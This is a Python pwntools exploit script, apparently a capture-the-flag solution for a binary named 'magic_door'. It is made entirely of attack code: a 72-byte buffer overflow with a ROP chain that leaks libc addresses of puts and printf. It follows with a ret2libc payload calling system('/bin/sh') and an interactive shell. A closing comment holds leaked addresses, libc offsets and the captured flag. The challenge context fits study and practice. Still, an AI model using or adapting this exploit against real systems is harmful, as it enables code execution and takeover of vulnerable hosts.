from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './magic_door'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# useful gadgets
ret = p64(0x000000000040101a)
pop_rdi = p64(0x0000000000401434)

# main = p64(0x0000000000401453)

# got of libc functions
plt_puts = p64(elf.plt.puts)
got_puts = p64(elf.got.puts)
got_printf = p64(elf.got.printf)

# magic door input

payload = b"+50015"

# crafting payload for leaking libs functions

padding = 72
secondPayload = b'A'*padding
secondPayload += pop_rdi + got_puts + plt_puts
secondPayload += pop_rdi + got_printf + plt_puts
# go back to the function for final execution
secondPayload += p64(elf.symbols.magic_door) 

#sending payload
print("elf.symbols.magic_door : ",elf.symbols.magic_door)
io.recvuntil(b'open?')
io.sendline(payload)
io.recvuntil(b'Where would you like to go?')
io.sendline(secondPayload)
io.recv()

# recv leaked address
output = io.recv().split(b'\n')
print("output : ", output)
leak_puts = u64(output[0].ljust(8,b"\x00"))
leak_printf = u64(output[1].ljust(8,b"\x00"))
print("puts {}".format(str(hex(leak_puts))))
print("printf {}".format(str(hex(leak_printf))))

# final payload
thirdPayload = b'A'*padding
thirdPayload += pop_rdi + p64(leak_printf + 0x177fa8)
thirdPayload += p64(leak_printf - 0xf980)

io.sendline(thirdPayload)
io.interactive()

'''
setvbuf 0x7f8487dce9e0
strcmp 0x7f8487c9e5f0
atoi 0x7f8487c60640
alarm 0x7f8487d07540

binsh:  0x19604f

    system  0x050d70    -0xf980
    puts    0x080e50    0x20760

wgmy{4a029bf40a28039c8492acfa866f8d96}

'''